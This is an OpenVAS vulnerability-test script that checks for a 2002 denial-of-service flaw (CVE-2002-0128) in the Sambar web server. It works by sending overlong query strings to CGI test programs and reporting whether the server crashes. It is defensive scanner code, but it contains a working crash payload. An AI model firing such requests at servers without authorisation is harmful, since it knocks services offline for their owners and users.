# OpenVAS Vulnerability Test
# $Id: sambar_DoS.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Sambar web server DOS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It is possible to kill the Sambar web server 'server.exe'
by sending it a long request like:
	/cgi-win/testcgi.exe?XXXX...X
	/cgi-win/cgitest.exe?XXXX...X
	/cgi-win/Pbcgi.exe?XXXXX...X
(or maybe in /cgi-bin/)

A cracker may use this flaw to make your server crash 
continuously, preventing you from working properly.";

tag_solution = "upgrade your server to Sambar 51p or delete those CGI.";

# References:
# From: "Tamer Sahin" <ts@securityoffice.net>
# To: bugtraq@securityfocus.com
# Subject: Sambar Webserver v5.1 DoS Vulnerability
# Date: Wed, 16 Jan 2002 01:57:17 +0200
# Affiliation: http://www.securityoffice.net
#
# Vulnerables:
# Sambar WebServer v5.1 
# NB: this version of Sambar is also vulnerable to a too long HTTP field.

if(description)
{
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 script_id(11131);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(3885);
 script_name("Sambar web server DOS");
 script_cve_id("CVE-2002-0128");
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Crashes Sambar web server";
 script_summary(summary);
 
 script_category(ACT_DENIAL);
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Denial of Service";
 script_family(family);
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/sambar");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

# The script code starts here

include("http_func.inc");
include("http_keepalive.inc");

# The advisories are not clear: is this cgitest.exe or testcgi.exe?
# Is it in cgi-bin or cgi-win?
dir[0] = "";		# Keep it here or change code below
dir[1] = "/cgi-bin/";
dir[2] = "/cgi-win/";

fil[0] = "cgitest.exe";
fil[1] = "testcgi.exe";
fil[2] = "Pbcgi.exe";

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
if(http_is_dead(port:port))exit(0);

banner = get_http_banner(port: port);
if (! banner) exit(0);
if(!egrep(pattern: "^Server:.*sambar", string: banner, icase: TRUE))exit(0);

# TBD: request each URL a few times...
function test_port(port, cgi)
{
 soc = http_open_socket(port);
 if(!soc) return(1);
 
 r = string(cgi, "?", crap(4096));
 req = http_get(item:r, port:port);
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 http_close_socket(soc);
 return(0);
}

for (c=0; c<3; c=c+1) {
 # WARNING! Next loop start at 1, not 0 !
 for (d=1; d<3; d=d+1) {
  if (test_port(port: port, cgi: string(dir[d], fil[c]))) {
   # If we fail on the first connection, this means the 
   # server is already dead
   if ((c > 0) || (d > 1)) security_hole(port);
   exit(0);
  }
 }
}

if(http_is_dead(port:port))security_hole(port);
